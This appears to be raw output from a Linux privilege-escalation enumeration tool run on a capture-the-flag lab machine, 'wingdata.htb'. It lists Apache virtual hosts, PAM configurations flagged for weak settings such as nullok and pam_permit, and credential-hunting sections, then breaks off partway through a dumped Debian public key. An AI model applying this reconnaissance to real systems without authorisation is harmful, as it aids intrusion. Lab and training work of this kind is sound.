[0mdrwxr-xr-x 2 root root 4096 Feb  9 08:19 /etc/apache2/[1;31msites-enabled[0m
[1;31mdrwxr-xr-x 2 root root 4096 Feb  9 08:19 /etc/apache2/sites-enabled[0m
[1;31mlrwxrwxrwx 1 root root 36 Nov  2  2025 /etc/apache2/sites-enabled/wingdata.htb.conf -> ../sites-available/wingdata.htb.conf[0m
<VirtualHost *:80>
    [1;31mServerName[0m localhost
    Redirect permanent / http://wingdata.htb/
</VirtualHost>
<VirtualHost *:80>
    [1;31mServerName[0m wingdata.htb
    [1;31mDocumentRoot[0m /var/www/wingdata.htb
    <Directory /var/www/wingdata.htb>
        Options -Indexes +FollowSymLinks
        [1;31mAllowOverride[0m None
        Require all granted
    </Directory>
    ErrorLog ${APACHE_LOG_DIR}/wingdata_error.log
    CustomLog ${APACHE_LOG_DIR}/wingdata_access.log combined
</VirtualHost>
<VirtualHost *:80>
    [1;31mServerName[0m ftp.wingdata.htb
    ProxyPreserveHost On
    [1;31mProxyPass[0m / http://127.0.0.1:8080/
    [1;31mProxyPassReverse[0m / http://127.0.0.1:8080/
    <Location "/">
        Require all granted
    </Location>
    ErrorLog ${APACHE_LOG_DIR}/ftp.wingdata_proxy_error.log
    CustomLog ${APACHE_LOG_DIR}/ftp.wingdata_proxy_access.log combined
</VirtualHost>
[1;31mlrwxrwxrwx 1 root root 35 Nov  2  2025 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf[0m


lrwxrwxrwx 1 root root 35 Nov  2  2025 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/[1;31m000-default.conf[0m




[1;34m╔══════════╣ [1;32mBrowser Profiles [1;90m(T1539,T1217)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#browser-data
[0m
[1;34m╔══════════╣ [1;32mAnalyzing PAM Auth Files (limit 70)
[0mdrwxr-xr-x 2 root root 4096 Feb  9 08:19 /etc/[1;31mpam.d[0m
-rw-r--r-- 1 root root 2133 Jul 28  2025 /etc/pam.d/[1;31msshd[0m
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so [1;31muser[0m_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open

[1;31mdrwxr-xr-x 2 root root 4096 Feb  9 08:19 /etc/pam.d[0m
[1;31m-rw-r--r-- 1 root root 384 Apr  7  2025 /etc/pam.d/chfn[0m
auth		sufficient	[1;31mpam_rootok.so[0m
[1;31m-rw-r--r-- 1 root root 1154 Jan 22 04:40 /etc/pam.d/common-session-noninteractive[0m
session	[default=1]			[1;31mpam_permit.so[0m
session	required			[1;31mpam_permit.so[0m
[1;31m-rw-r--r-- 1 root root 92 Apr  7  2025 /etc/pam.d/passwd[0m
[1;31m-rw-r--r-- 1 root root 185 Jun 24  2025 /etc/pam.d/sudo[0m
[1;31m-rw-r--r-- 1 root root 4126 Apr  7  2025 /etc/pam.d/login[0m
[1;31m-rw-r--r-- 1 root root 2259 Nov 21  2024 /etc/pam.d/su[0m
auth       sufficient [1;31mpam_rootok.so[0m
[1;31m-rw-r--r-- 1 root root 143 Nov 21  2024 /etc/pam.d/runuser[0m
auth		sufficient	[1;31mpam_rootok.so[0m
[1;31m-rw-r--r-- 1 root root 606 Jul 17  2022 /etc/pam.d/cron[0m
[1;31m-rw-r--r-- 1 root root 1208 Jan 22 04:40 /etc/pam.d/common-account[0m
account	required			[1;31mpam_permit.so[0m
[1;31m-rw-r--r-- 1 root root 138 Nov 21  2024 /etc/pam.d/runuser-l[0m
[1;31m-rw-r--r-- 1 root root 278 Jan  8 09:28 /etc/pam.d/vmtoolsd[0m
auth       [1;31msufficient       pam_unix.so[0m shadow
account    [1;31msufficient       pam_unix.so[0m
[1;31m-rw-r--r-- 1 root root 581 Apr  7  2025 /etc/pam.d/chsh[0m
auth		sufficient	[1;31mpam_rootok.so[0m
[1;31m-rw-r--r-- 1 root root 1146 Jan 22 04:40 /etc/pam.d/common-session[0m
session	[default=1]			[1;31mpam_permit.so[0m
session	required			[1;31mpam_permit.so[0m
[1;31m-rw-r--r-- 1 root root 137 Nov 21  2024 /etc/pam.d/su-l[0m
[1;31m-rw-r--r-- 1 root root 1214 Jan 22 04:40 /etc/pam.d/common-auth[0m
auth	[success=1 default=ignore]	[1;31mpam_unix.so nullok[0m
auth	required			[1;31mpam_permit.so[0m
[1;31m-rw-r--r-- 1 root root 1620 Jan 22 04:40 /etc/pam.d/common-password[0m
password	required			[1;31mpam_permit.so[0m
[1;31m-rw-r--r-- 1 root root 170 Jun 24  2025 /etc/pam.d/sudo-i[0m
[1;31m-rw-r--r-- 1 root root 92 Apr  7  2025 /etc/pam.d/chpasswd[0m
[1;31m-rw-r--r-- 1 root root 2133 Jul 28  2025 /etc/pam.d/sshd[0m
[1;31m-rw-r--r-- 1 root root 92 Apr  7  2025 /etc/pam.d/newusers[0m
[1;31m-rw-r--r-- 1 root root 520 Sep 21  2023 /etc/pam.d/other[0m


[1;34m╔══════════╣ [1;32mAnalyzing Ldap Files (limit 70)
[0mThe password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Feb  9 08:19 /etc/[1;31mldap[0m


[1;34m╔══════════╣ [1;32mAnalyzing Keyring Files (limit 70)
[0mdrwxr-xr-x 2 root root 4096 Feb  9 08:19 /etc/apt/[1;31mkeyrings[0m
drwxr-xr-x 2 root root 4096 Feb  9 08:19 /usr/share/[1;31mkeyrings[0m




[1;34m╔══════════╣ [1;32mAnalyzing Postfix Files (limit 70)
[0m-rw-r--r-- 1 root root 2176 Feb  8  2022 /usr/share/X11/xkb/keycodes/[1;31maliases[0m

-rw-r--r-- 1 root root 761 Apr  3  2022 /usr/share/bash-completion/completions/[1;31mpostfix[0m


[1;34m╔══════════╣ [1;32mAnalyzing Http conf Files (limit 70)
[0mlrwxrwxrwx 1 root root 15 Dec  5  2025 /usr/share/doc/apache2/examples/apache2/original/httpd.conf -> ../apache2.conf

[1;34m╔══════════╣ [1;32mAnalyzing Proxy Config Files (limit 70)
[0m-rw-r--r-- 1 root root 0 Nov  2  2025 /etc/[1;31menvironment[0m



[1;34m╔══════════╣ [1;32mAnalyzing DNS Files (limit 70)
[0m-rw-r--r-- 1 root root 826 Apr  3  2022 /usr/share/bash-completion/completions/[1;31mbind[0m
[1;31m-rw-r--r-- 1 root root 826 Apr  3  2022 /usr/share/bash-completion/completions/bind[0m




[1;34m╔══════════╣ [1;32mAnalyzing Other Interesting Files (limit 70)
[0m-rw-r--r-- 1 root root 3526 Jun  6  2025 /etc/skel/[1;31m.bashrc[0m





-rw-r--r-- 1 root root 807 Jun  6  2025 /etc/skel/[1;31m.profile[0m





[1;34m╔══════════╣ [1;32mSearching mysql credentials and exec [1;90m(T1552.001)
[0m
[1;32mMySQL process not found.[0m
[1;34m╔══════════╣ [1;32mAnalyzing PGP-GPG Files (limit 70)
[0m/usr/bin/gpg
[1;90mgpg Not Found
[0m[1;90mnetpgpkeys Not Found
[0m[1;90mnetpgp Not Found
[0m

-rw-r--r-- 1 root root 11861 Apr  9  2025 /etc/apt/trusted.gpg.d/debian-archive-bookworm-automatic[1;31m.asc[0m
-----BEGIN PGP PUBLIC KEY BLOCK-----
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
